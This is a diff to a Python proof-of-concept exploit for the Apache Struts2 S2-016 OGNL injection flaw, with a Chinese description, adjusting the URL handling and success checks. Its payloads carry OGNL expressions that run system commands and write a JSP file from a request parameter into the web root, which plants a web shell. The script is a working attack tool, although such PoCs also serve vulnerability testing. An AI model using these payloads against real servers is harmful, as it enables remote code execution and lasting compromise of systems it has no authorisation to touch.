@@ -9,6 +9,8 @@ Desc
 	但是这些前缀后面同时可以跟OGNL表达式，由于struts2没有对这些前缀做过滤，导致利用OGNL表达式调用java静态方法执行任意系统命令。
 Version
 	2.0.0 - 2.3.15
+Usage:
+	POC: http://your-ip:8080/index.action?redirect:OGNL表达式
 Referer:
 	- http://struts.apache.org/docs/s2-016.html
 	- http://www.freebuf.com/articles/web/25337.html
@@ -20,7 +22,7 @@ import urllib
 
 def poc(url):
     url = url if '://' in url else 'http://' + url
-    url = url.split('#')[0].split('?')[0].rstrip('/')
+    url = url.split('#')[0].split('?')[0]
 
     command = "echo rivirsir"
     payloads = [
@@ -33,21 +35,19 @@ def poc(url):
     	'#req=#context.get("com.opensymphony.xwork2.dispatcher.HttpServletRequest"),#p=(#req.getRealPath("/")+"css3.jsp").replaceAll("\\", "/"),new java.io.BufferedWriter(new java.io.FileWriter(#p)).append(#req.getParameter("c")).close()}'   ]
 
     for payload in payloads:
-        vulurl = url + '/index.action?redirect:%s' % urllib.quote(payload)
+        vulurl = url + '?redirect:%s' % urllib.quote(payload)
         try:
             resp = requests.get(vulurl, timeout=10)
-            print resp.request.url
             if resp.text.startswith("rivirsir"):
-                print resp.text
-            # return True#
-            if "/usr/local/tomcat/webapps/ROOT/" in resp.text:
-                print resp.text
-                #return True
+                #print resp.text
+                return True
+            if len(resp.text) <= 100 and "webapps" in resp.text:
+            	print 'web dir: ',resp.text
+                return True
         except Exception as e:
             print(e)
     return False
 
 
 if __name__ == '__main__':
-    print
-    poc("http://vuln.com:8080/")
+    print poc("http://localhost:8080/s2-016/index.action")
